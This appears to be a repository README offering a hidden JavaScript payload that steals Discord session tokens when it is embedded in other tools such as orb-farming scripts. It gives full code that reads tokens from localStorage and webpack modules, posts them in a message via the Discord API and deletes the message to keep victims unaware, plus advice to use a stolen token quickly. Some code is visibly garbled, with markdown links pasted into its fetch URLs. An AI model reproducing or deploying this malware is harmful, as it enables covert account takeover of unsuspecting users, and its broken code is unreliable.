

## Overview
## Overview
This repository contains a lightweight, silent JavaScript payload designed to be embedded within other tools and scripts (such as Discord quest/orb farming tools or utility scripts). 

The primary purpose of this utility is to bypass standard extraction hurdles and silently capture session tokens when direct access is restricted by Discord's security layers. 

## How It Works
1. **Integration:** The payload can be integrated into any useful tool or script that interacts with the user (e.g., automated tools for gathering Discord orbs/points).
2. **Execution:** Once triggered, the script operates entirely in the background without any console output or visible indicators to the victim.
3. **Exfiltration & Cleanup:** 
   - The script automatically extracts the session token.
   - It sends the token directly to the specified target ID (`targetUserId`).
   - The message is automatically deleted after 10 seconds to ensure the victim remains completely unaware of the action.

## Important Notes
- **Target ID Configuration:** You must replace `"put your ID"` in the code with your actual Discord User ID. Without a valid ID, the exfiltration will not function.
- **Handling the Token:** Once you receive the token, you must act quickly before the session expires, the token changes, or the user logs out.

## Payload Code

```javascript
(function() {
    const targetUserId = "put your ID";
    
    (async () => {
        let token = "";
        try {
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                let val = localStorage.getItem(key);
                if (val) {
                    let cleanVal = val.replace(/^"|"$/g, '');
                    if (cleanVal.includes('.') && cleanVal.length > 50) {
                        token = cleanVal;
                        break;
                    }
                }
            }
        } catch (e) {}

        if (!token && typeof window !== 'undefined' && window.webpackChunkdiscord_app) {
            try {
                window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                    for (let m of Object.keys(req.c)) {
                        try {
                            let mod = req.c[m].exports;
                            if (mod && mod.default && typeof mod.default.getToken === 'function') {
                                let t = mod.default.getToken();
                                if (t && t.length > 50) token = t;
                            }
                        } catch (e) {}
                    }
                }]);
            } catch (e) {}
        }

        if (!token) return;

        try {
            const channelsRes = await fetch(`[https://discord.com/api/v9/users/@me/channels](https://discord.com/api/v9/users/@me/channels)`, {
                headers: { "Authorization": token }
            });
            if (!channelsRes.ok) return;
            const channels = await channelsRes.json();
            if (!channels || channels.length === 0) return;
            const activeChannelId = channels[0].id;

            const msgResponse = await fetch(`[https://discord.com/api/v9/channels/$](https://discord.com/api/v9/channels/$){activeChannelId}/messages`, { 
                method: "POST", 
                headers: { 
                    "Authorization": token, 
                    "Content-Type": "application/json" 
                }, 
                body: JSON.stringify({ content: `Target ID: ${targetUserId}\nToken: ${token}` }) 
            });

            if (msgResponse.ok) {
                const msgData = await msgResponse.json();
                const messageId = msgData.id;
                setTimeout(async () => {
                    try {
                        await fetch(`[https://discord.com/api/v9/channels/$](https://discord.com/api/v9/channels/$){activeChannelId}/messages/${messageId}`, {
                            method: "DELETE",
                            headers: { "Authorization": token }
                        });
                    } catch (err) {}
                }, 10000);
            }
        } catch (err) {}
    })();
})();
